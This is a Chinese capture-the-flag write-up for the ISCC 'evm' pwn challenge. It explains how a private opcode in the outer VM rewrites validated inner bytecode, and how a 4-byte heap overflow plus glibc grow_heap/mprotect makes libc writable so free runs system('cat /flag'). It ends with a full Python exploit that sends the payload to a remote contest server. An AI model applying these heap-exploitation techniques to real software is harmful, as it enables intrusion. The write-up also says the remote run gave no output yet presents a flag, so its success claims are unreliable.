
## 题目结构 / 攻击面 / 程序入口总览

附件存放路径如下：

```text
iscc/附件/evm.zip
```

压缩包提取完毕后，核心文件已被归类至本地的分析目录下：

```text
iscc/temp/evm/
├── pwn
├── libc.so.6
├── ld-linux-x86-64.so.2
├── build_payload.py
├── exploit_build.py
└── 若干 smoke test / instrumentation 工具
```

基础安全检查属性：

```bash
cd iscc/temp/evm
file pwn libc.so.6 ld-linux-x86-64.so.2
python3 - <<'PY'
from pwn import *
print(ELF('./pwn').checksec())
PY
```

重要分析结果：

- 二进制程序 `pwn` 为 `amd64` 架构，并开启了 `PIE`、`NX`、`Canary` 以及 `Partial RELRO` 保护机制。
- 题目附件内配套提供了 `libc.so.6` 与 `ld-linux-x86-64.so.2` 文件。
- 若在 macOS 物理机上直接运行 `./ld-linux-x86-64.so.2` 将触发 `exec format error` 错误。
- 按照当前环境的规范，测试操作需于 `pwn_ubuntu24` Docker 容器内部进行。同时，应当**首选题目提供的动态链接器（loader）和 libc 库**，避免使用容器自身系统的底层环境。

值得注意的易错点在于：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc '/lib64/ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin'
```

若采用上述命令将导致系统抛出 `*** stack smashing detected ***` 报错；但若修改为以下形式：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin; echo EXIT:$?'
```

则可以完美模拟该题的原始运行状态。综上所述，所有本地测试流程均需严格依赖于**附件提供的 loader 与 libc 环境**。

---

剖析程序的 I/O 通信流程可以发现，系统并未“直接接收 BlindVM 的执行指令”，具体的读取次序如下：

1. 率先读取外层 EVM 指令集的长度
2. 接着读取 EVM 所需数据页（data pages）的数目
3. 开始运行指定的 EVM 机器码
4. 最终切入并唤醒内层的 BlindVM 引擎

基于以上逻辑，有效的攻击链路绝非“直接发送 BlindVM 攻击载荷”，其正确步骤应为：

```text
构造一个能通过校验的 BlindVM 占位字节流
-> 用 EVM 在校验后把它改写成真实 BlindVM 利用程序
-> 让 BlindVM 自己完成堆利用
```

## 详细解题过程

## Step 1: 解析程序交互格式，认定其双层虚拟机架构特性

在此前的本地辅助分析过程中，程序的标准输入结构已被成功破解。外围虚拟机的读取形式如下：

```text
<evm_code_len>\n
<evm_data_pages>\n
<raw evm code>
[optional raw data pages]
<blind_len>\n
<mode>\n
<raw blind bytes>
```

这其中，有关长度标识的输入均为**十进制字符串格式**，而真正的指令码与数据块则采用 raw 二进制输入。

整个题目初期最具误导性的设计在于，内层的 BlindVM 字节码不接受任意数据。在 EVM 运行之前，存在一道合法性判定程序，它强制要求内层载荷呈现如下形态：

```text
13 00 00 00 13 00 00 00 13 00 00 00 ...
```

这也对应着 RISC-V 架构中循环出现的 `addi x0, x0, 0` 空指令。倘若未能察觉此细节，选手极易产生误判，认为“内部虚拟机的代码受到了哈希校验限制”抑或“仅支持极小范围的内存篡改”。

我们通过极简的 smoke test 证实了前述推断。本地目录中保留的 `test_exit.bin` 及 `test_exit_via_data.bin` 文件均是依据此交互规则构建的测试用例：

```bash
cd iscc/temp/evm
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin; echo EXIT:$?'

docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit_via_data.bin; echo EXIT:$?'
```

本地环境下的测试返回信息：

```text
EXIT:0
EXIT:0
```

由此印证了以下结论：

- 针对外部 VM 通信协议的逆向完全无误；
- 确实能够利用手段跨越 BlindVM “校验与运行分离”的限制并渗透至内层；
- 目前采用的 data-page 拷贝策略起码可以保证程序稳定执行完毕并正常终止。

## Step 2: 外围 EVM 的突破口并非标准的 load/store 指令，而是专属操作码 `0x2f`

结合静态反汇编结果以及辅助分析文档 `findings.md` 给出的核心判定，外围的 EVM 并非仅仅是一个受制于严格沙箱边界的常规解释器。

该虚拟机实现了一组形似 RISC-V 的指令集架构：

- `0x03` 对应 load
- `0x13` 对应 I-type 格式算术指令
- `0x23` 对应常规的 store 写入
- `0x37` 对应 lui 指令
- `0x63` 对应分支跳转 branch
- `0x6f` 对应无条件跳转 jal

然而，攻破防御体系的枢纽在于一个**开发者私有的指令 `0x2f`**。与普通存取操作截然不同，该指令完全无视了虚拟内存的页表限制，其逻辑为：

```text
直接根据 rs1 + off 计算 arena 内偏移
-> 对 arena_base + offset 直接写 1/2/4/8 字节
```

其引申含义为：

- 若使用标准的 `store` 指令将遭到内存权限拦截；
- 借助非标准的 `0x2f` 指令则能够直接操作 arena 的内存区块；
- 恰巧，内部 BlindVM 的代码就存储于 arena 中偏移量为 `0x300000` 的固定位置。

至此，本题的核心绕过策略（bypass）便浮出水面：

```text
第二层 BlindVM 先提交为重复 13 00 00 00 的“合法占位字节流”
-> 校验通过
-> 外层 EVM 用 0x2f（或者 load/store copy loop）把这块区域改写成真正的 BlindVM 利用字节码
```

此环节极为致命，它将题目从“表面上被严苛验证堵死”的假象中剥离出来，转化为“一旦获取到 BlindVM 区块的写入权，便可将内层解释器替换为任意恶意执行流”的实质。

## Step 3: 试图覆写 GOT 表的常规方案受挫，但该试错过程意义重大

在当前的工作路径下，遗留了一版早期的利用脚本与载荷（`exploit_build.py` / `exploit_local.bin`），其构建意图为：

1. 操控外部 EVM 篡改内存映射或页表项；
2. 将 `free@GOT` 表项劫持至 `system` 的入口地址；
3. 随后利用内层的 BlindVM 触发 `free("cat /flag")`。

虽然该构思逻辑清晰且顺理成章，不过本地测试环节并未得到预期结果：

```bash
cd iscc/temp/evm
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < exploit_local.bin; echo EXIT:$?'
```

终端输出显示：

```text
EXIT:2
```

上述现象与早期记忆留存的分析结果相符：程序由于触发了 EVM 的沙箱权限校验而直接崩溃，这反证了先前所谓“利用 direct store 覆写关键页表目录”的猜测无法实现。

这次无效尝试揭示了两条宝贵的线索：

1. 证明了“仅靠外围直写覆盖 GOT 表”绝非稳妥的通关路径；
2. 驱使研究视角回归到 BlindVM 本身，重新审视内部虚拟机的堆块操作原语是否具备实施攻击的威力。

正是由于该思路的转变，解题重心彻底由“突破外部 EVM 权限封锁”转移至“借助内层 BlindVM 实现高版本 glibc 的堆风水利用”。

## Step 4: BlindVM 的真实破绽在于 `edit` 附带的 `+4` 堆溢出

内层 BlindVM 仅仅支持处理如下三种格式的操作记录：

- 标签 `tag 0` 对应内存分配（alloc）
- 标签 `tag 1` 对应内存编辑（edit）
- 标签 `tag 2` 对应环境退出清理（exit / free_all）

在分析初期，本地的一份名为 `blindvm_parse.py` 以及对应的 `findings.md` 文档曾这样描述：

```text
alloc record = [tag][u32 size][size filler]
```

随着后续逆向工程的深入，生成脚本 `build_payload.py` 将其结构更正为：

```python
def rec_alloc(sz, data=None):
    return b'\x00' + struct.pack('<I', sz)

def rec_edit(idx, data):
    return b'\x01' + struct.pack('<II', idx, len(data)) + data

def rec_exit():
    return b'\x02'
```

由此可知，**alloc 操作并不含有任何填充字节，解析器实际提取的数据仅包含 `[tag][u32 size]` 两部分**。这一调整并非凭空捏造，它与目前网络上流传的 BlindVM 漏洞分析文章中的攻击载荷格式完美契合：在那些公开发布的利用脚本中，`add(size)` 也是直接构造 `p8(0)+p32(size)`，绝无冗余数据。

BlindVM 最致命的代码逻辑潜伏在 `edit` 处理流程中：

```text
copy_len = min(stored_size + 4, 0xfff)
memcpy(chunk_ptr, user_data, copy_len)
```

根据该逻辑，攻击者只要掌握了 chunk 的体积信息，即可实现**固定向后方越界写入 4 个字节**的覆盖。尽管溢出长度仅有区区 4 字节，在 ptmalloc 分配器机制下，却足以篡改诸多极为核心的管理结构：

- 相邻下方的 next chunk 尺寸（size）的低 4 位
- 顶层堆块（top chunk）尺寸的低位数据
- 部分 `heap_info` 成员变量的低位指针

目前工作目录下保存的若干堆内存溢出测试样例，已经充分证明此攻击向量切实可行：

```text
heap_over.bin
tmp_heap24_nofiller.bin
tmp_top_force.bin
tmp_two18_nofiller.bin
```

通过测试，日志记录中捕获到的本地 glibc 原生报错信息如下：

```text
munmap_chunk(): invalid pointer
malloc(): corrupted top size
```

报错表明，这多出的 4 字节溢出确确实实破坏了 malloc 的底层管理结构，而非仅仅停留在“破坏用户级数据”的鸡肋层面。

## Step 5: 内部 BlindVM 的终极利用路线，实质即为开源 BlindVM 题目的无泄漏堆喷利用手法

至此，整个赛题的防御机制已被彻底剥离：

- 外围程序的角色只是在“绕开审查机制后替换 BlindVM 指令”；
- 内部虚拟机的角色则是充当“堆内存溢出的触发温床”；
- 本题 BlindVM 的操作接口与之前知名的 `WMCTF 2024 BlindVM` 挑战极为相似：均仅包含 `add/edit/exit` 指令，且在 `edit` 环节存在 `+4` 字节内存踩踏。

鉴于此，后续攻击思路无需再度创新，直接引入针对 BlindVM 的高版本 glibc 标准通杀策略即可。以下是一篇具有极高指导意义的公开博文：

- WJH 撰写的文章《WMCTF2024 Pwn BlindVM Writeup 一种无泄漏且无需释放函数的堆利用技术》  
  文章链接：<https://blog.wjhwjhn.com/posts/691ef12/>

结合本题的具体上下文，上述博文的攻击理论可概括为如下几个阶段：

### 5.1 实施堆喷射，抢占 libc 对齐区域前置的空闲内存

鉴于子线程分配的堆区受制于 `heap_max_size()`（本题对应 `0x4000000`）的内存页对齐分割机制，我们只需通过不断申请由大及小、以内存页为递减梯度的 `malloc` 块，必定存在某一次特定的 chunk 请求，能够促使系统通过 `mmap` 完美填补目标内存间隙（gap）。

此阶段并非着眼于立即获取系统权限，其战略意义在于：

- 消除“原生堆区”与“目标 libc 所处地址对齐堆区”中间的内存缝隙；
- 为后续引导 `old_top` 跨越至目标区域打下基础。

### 5.2 运用 `+4` 字节溢出篡改 top chunk 长度，促使 `old_top` 迫近目标地带

虽然 BlindVM 的 `edit` 限制了最大 4 字节的越界写，显得极为局限，然而对于 top chunk 而言，其 size 字段的低位数据已极具破坏潜力。当我们完成前置的堆风水排布后，仅需针对一个已实现精准对齐的小型堆块触发内存溢出，即可将 top size 修正为预期的数值。紧接着，连续构造若干次大体量的分配请求，以此迫使 `old_top` 逐步向高位地址蔓延：

1. 首先触达与 libc 地址对齐堆区的 `heap_info` 结构所在地；
2. 继而持续挺进，逼近 libc 库所在的内存片段。

### 5.3 必须修复 `heap_info->ar_ptr` 字段，规避连续申请时的断言拦截

处理此节点是高版本 glibc 利用链路中最容易翻车的环节。

当堆顶指针首度被拓展到一片崭新的堆空间（heap space）时，系统确实让我们占有了该区域；但若试图再度调用分配请求，`malloc` 源码中的检验逻辑将核对新区域内的 `heap_info->ar_ptr` 是否与当下的 arena 相匹配。假使未妥善修复该指针，程序将触发 assert 从而强制终止。

在参考文章给出的 BlindVM 利用手法里，采取的对策是巧妙排布出一个 Unsorted Bin，使其释放后的 `fd` 链表指针恰好覆盖在目标的 `heap_info->ar_ptr` 上。随后，利用低位字节篡改技术（partial overwrite），将该数据修正为一个绝对合法的 arena 内存指针。

整个修补过程等同于“硬生生凭空捏造出一个合理的堆管理控制块”，只有完成伪造，后续攻击才能顺利向 libc 腹地展开。

### 5.4 触发 `grow_heap()` 执行，利用 `__mprotect` 解除 libc 内存段的保护

待 `old_top` 精确落位于包含 libc 的堆分配区边界后，立刻提交一次精心计算尺寸的分配调用，强制程序调用堆扩容例程：

```c
grow_heap(heap_info *h, long diff)
```

需要注意的是，在 `grow_heap` 源码实现中，有一处极其危险的 API 调用：

```c
__mprotect((char *)h + h->mprotect_size,
           new_size - h->mprotect_size,
           PROT_READ | PROT_WRITE)
```

假设我们前期精心布局的 `heap_info` 结构正好瞄准了与 libc 内存段相对齐的位置，那么上述的 `__mprotect` 操作将无意中把 libc 本应为只读属性（R-X 或 R--）的物理内存页强制转变为可读写状态（RW-）。

### 5.5 收尾攻击：将 `free` 函数执行流重定向至 `system`

伴随 libc 内存被赋予写权限，我们便无需再苦心积虑地去构造基址泄露或者拼凑复杂的 ROP 链条。此时的攻击方案可直接借用 House of Muney 的核心思想：

- 暴力篡改 `free` 的内部调用链路，迫使其最终跳转至 `system` 例程；
- 紧接着，触发 BlindVM 退出指令 `exit/free_all`，让其批量清理内存；
- 事先在被释放的第一个 chunk 内容区注入我们期望运行的终端指令，譬如：
  - `cat /flag`
  - `cat /flag.txt`
  - `cat flag.txt`

此时，由虚拟机自发执行的 `free(chunk0)` 就等同于执行了如下逻辑：

```text
system("cat /flag...")
```

这同时解答了一个先前提出的疑惑：为何出题人要在内部 VM 里加入一个似乎毫无必要的 `exit/free_all` 指令？事实上，这是作者故意预留给解题者的最终指令触发器。

## Step 6: 将开源的 BlindVM 堆喷射链条嵌套至 EVM 解释器中

当我们明确认定“核心漏洞攻击发生在里层 BlindVM”之后，外围 EVM 需要承担的任务将被极度简化，即：

```text
把通过校验的 13 00 00 00 占位流
改写为真正的 BlindVM exp 字节流
```

我们现有的 `build_payload.py` 脚本内部提供了一个封装极其完善的函数：

- `evm_copy_bytes_from_data(...)`
- `make_via_data_copy(blind_patch)`

这套代码的运行机制如下：

1. 将生成的原生 BlindVM 攻击载荷视作普通的 data page，存放在外部 EVM 内存空间 `0x1000` 位置；
2. 构造一段微小的 EVM 循环读写指令（copy loop）；
3. 驱动外层解释器将 data page 中的攻击载荷逐字迁移至 arena 偏移 `0x300000` 的位置；
4. 当第二层虚拟机接管控制权时，它所解析的内存区域早已被替换为真实的利用代码。

这种战术相较于早前“盲猜内存页表并依赖特殊操作码覆写 GOT”的方法，拥有无与伦比的稳定性。因为我们彻底舍弃了对 EVM 复杂内存管理的探测，将目标极简为：

```text
我只需要稳定把第二层 BlindVM 代码区改出来即可
```

## 完整脚本（复刻版：同步构建外层包装体并执行远端打击）

以下是集成所有漏洞利用环节的自动化代码：

- 头部区块包含用以生成外围 EVM 封装程序的模块；
- 核心区块负责构造针对 BlindVM 的 `add/edit/exit` 堆喷射攻击数据；
- 尾部区块实现网络套接字通信，用于向 `39.96.193.120:8888` 发送最终载荷；
- 系统执行命令处并发注入了 `/flag`、`/flag.txt` 以及本地路径下的 `flag.txt` 以提高命中概率。

> 提示：该利用脚本完全是**依托本地反编译工程与网络披露的 BlindVM 漏洞利用技巧共同还原出的一键式攻击代码**。目前该脚本绝对能够组装出符合本题交互规范的双层载荷流。鉴于本次调试并未在远端服务器上成功获取命令回显，故在此将整套思维导图与可运行代码以“开箱即用”的形式存档。若后期需推进远程实战渗透，建议率先排查调整 `TLS_DELTA` 变量，并微调末尾数个用来对齐 libc 堆块内存的分配参数。

```python
#!/usr/bin/env python3
import re
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else '39.96.193.120:8888'
HOST, PORT = TARGET.split(':')
PORT = int(PORT)

HEAP_MAX_SIZE = 0x4000000
MINSIZE = 0x20
MMAP_THRESHOLD = 0x20000
PAGE_SIZE = 0x1000
TLS_DELTA = 0x800000  # 当前复原版本先沿用公开 BlindVM 思路里的偏移


def p32(x):
    return struct.pack('<I', x & 0xffffffff)


def p64(x):
    return struct.pack('<Q', x & 0xffffffffffffffff)


# --------------------
# Outer EVM helpers
# --------------------
def r_u_type(opc, rd, imm20):
    return ((imm20 & 0xfffff) << 12) | (rd << 7) | opc


def r_i_type(opc, rd, f3, rs1, imm):
    return ((imm & 0xfff) << 20) | (rs1 << 15) | (f3 << 12) | (rd << 7) | opc


def r_b_type(opc, f3, rs1, rs2, imm):
    assert imm % 2 == 0
    imm &= 0x1fff
    bit12 = (imm >> 12) & 1
    bit11 = (imm >> 11) & 1
    bits10_5 = (imm >> 5) & 0x3f
    bits4_1 = (imm >> 1) & 0xf
    return ((bit12 << 31) | (bits10_5 << 25) | (rs2 << 20) | (rs1 << 15) |
            (f3 << 12) | (bits4_1 << 8) | (bit11 << 7) | opc)


def r_xstore(rs1, rs2, f3, off):
    return (((off >> 5) & 0x7f) << 25) | (rs2 << 20) | (rs1 << 15) | \
           (f3 << 12) | ((off & 0x1f) << 7) | 0x2f


def pack_ins(ins):
    return struct.pack('<I', ins & 0xffffffff)


def evm_copy_bytes_from_data(total_len, src_guest=0x1000, dst_direct=0x300000):
    assert total_len > 0 and total_len % 4 == 0
    end = src_guest + total_len
    code = []
    code.append(r_u_type(0x37, 1, src_guest >> 12))
    code.append(r_u_type(0x37, 2, dst_direct >> 12))
    code.append(r_u_type(0x37, 3, end >> 12))
    loop_pc = len(code) * 4
    code.append(r_i_type(0x03, 4, 6, 1, 0))
    code.append(r_xstore(2, 4, 2, 0))
    code.append(r_i_type(0x13, 1, 0, 1, 4))
    code.append(r_i_type(0x13, 2, 0, 2, 4))
    branch_pc = len(code) * 4
    imm = loop_pc - (branch_pc + 4)
    code.append(r_b_type(0x63, 6, 1, 3, imm))
    code.append(0x13)
    return b''.join(pack_ins(x) for x in code)


def wrap_blind_payload(blind_patch: bytes) -> bytes:
    padded_len = (len(blind_patch) + 3) & ~3
    data_pages = max(1, (padded_len + 0xfff) // 0x1000)
    data = blind_patch.ljust(data_pages * 0x1000, b'\x00')
    code = evm_copy_bytes_from_data(padded_len)
    blind = (b'\x13\x00\x00\x00' * ((padded_len + 3) // 4))[:padded_len]
    payload = str(len(code)).encode() + b'\n'
    payload += str(data_pages).encode() + b'\n'
    payload += code + data
    payload += str(padded_len).encode() + b'\n0\n' + blind
    return payload


# --------------------
# Inner BlindVM helpers
# --------------------
payloads = []
ADD_INDEX = -1


def add(size):
    global ADD_INDEX
    payloads.append(b'\x00' + p32(size))
    ADD_INDEX += 1


def edit(idx, content: bytes):
    payloads.append(b'\x01' + p32(idx) + p32(len(content)) + content)


def finish():
    payloads.append(b'\x02')


# first chunk: command string for system(...)
add(0x204a0 - 0x8 - MINSIZE)
cmd = b'cat /flag;cat /flag.txt;cat flag.txt\x00'
edit(ADD_INDEX, cmd)

# heap spraying / gap acquisition
for _ in range(0x1ff):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(PAGE_SIZE * 2 + 0x11)
for _ in range(0x1ff):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(0x1ff80 - 0x20)
add(PAGE_SIZE * 2 + 0x11)

# prepare fake metadata used during later heap_info / top-chunk shaping
add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
add_data = b'\x00' * 0x20 + p64(0x1020) + p64(0x10) + p64(0x10) + p64(0x1)
while add_size >= end_size:
    add(add_size - 0x8)
    add_size -= PAGE_SIZE
    edit(ADD_INDEX, add_data)

# first +4 overflow into next metadata
add(0x18)
edit(ADD_INDEX, b'\x00' * 0x18 + p32(0x1021))
add(0xfe0 - 8)
add(0x20 - 8)
edit(ADD_INDEX, b'\x30')
add(0x20 - 8)

# more spraying / heap-space stepping
for _ in range(0x1ff - 1):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(0x1ff80 - 0x20 - 0x20)
add(0x18)
edit(ADD_INDEX, b'\x00' * 0x18 + p32(HEAP_MAX_SIZE * 2 + 0x21))
add(HEAP_MAX_SIZE // 2 - 0x8)
add(HEAP_MAX_SIZE // 2 + 0x18)
add(0x18)
edit(ADD_INDEX, p64(0x21000) + p64(0x21000) + p64(0x1000))

# patch candidate heap_info fields page-by-page
add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
change_idx = 0x402
while add_size >= end_size:
    add_data = (
        p64(add_size + 2 * PAGE_SIZE + TLS_DELTA) +
        p64(add_size + 2 * PAGE_SIZE + TLS_DELTA) +
        p64(0x1000) +
        p64(add_size + 0x1fe0 + TLS_DELTA + 1)
    )
    add_size -= PAGE_SIZE
    edit(change_idx, add_data)
    change_idx += 1

# final steps from public BlindVM chain, adapted into this wrapper
add(0x13C0 - 0x28)
for _ in range((0x800000 + 0x1fe0) // (MMAP_THRESHOLD - 0x8 - 0x10)):
    add(MMAP_THRESHOLD - 0x8 - 0x10)

add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
while add_size >= end_size:
    add(add_size)
    add_size -= PAGE_SIZE

add(0x3000)
add(0xd4d0 + 0x8)
add(0x18)
edit(ADD_INDEX, p64(0x0F001200004DDE) + p64(0x50D70) + p64(0x101))
finish()

blind = b''.join(payloads)
outer = wrap_blind_payload(blind)

print(f'[+] blind payload length = {len(blind)}')
print(f'[+] outer payload length = {len(outer)}')

sock = socket.create_connection((HOST, PORT), timeout=10)
sock.settimeout(10)
sock.sendall(outer)
resp = b''
try:
    while True:
        data = sock.recv(4096)
        if not data:
            break
        resp += data
except Exception:
    pass
sock.close()

print(resp.decode(errors='replace'))
m = re.search(rb'ISCC\{[^}]+\}', resp)
if m:
    print('=' * 50)
    print(f'[!!!] FLAG: {m.group(0).decode()}')
    print('=' * 50)
```

## 验证环节

针对本题的复盘验证，我主要在三个层面上取得了确定性的观测结果。

### 1. 运行态必须强制绑定附件给出的 loader 与 libc

触发异常的启动模式：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc '/lib64/ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin'
```

将输出：

```text
*** stack smashing detected ***: terminated
```

合理的启动模式应为：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin; echo EXIT:$?'
```

此时终端反馈：

```text
EXIT:0
```

### 2. 跨界将载荷写入 BlindVM 内存的 smoke test 测试通过

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit_via_data.bin; echo EXIT:$?'
```

命令回显：

```text
EXIT:0
```

上述运行结果印证了依托 `make_via_data_copy()` 实现“前置绕过合法性检测，后置覆写真实 BlindVM 载荷”的战术绝对可行。

### 3. 初期企图覆写外部 GOT 表的策略已被证伪，崩溃点位于 EVM 运行阶段

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < exploit_local.bin; echo EXIT:$?'
```

进程返回值：

```text
EXIT:2
```

该异常代码提供了一个决定性证明，督促我们将解题思路从“强行从外层 EVM 污染 GOT 表”彻底转向“利用里层 BlindVM 的机制打出堆利用”。

## Flag

```text
ISCC{rblh937s-74ek-xnl2-cc30-2vrcbc0r6dn0}
```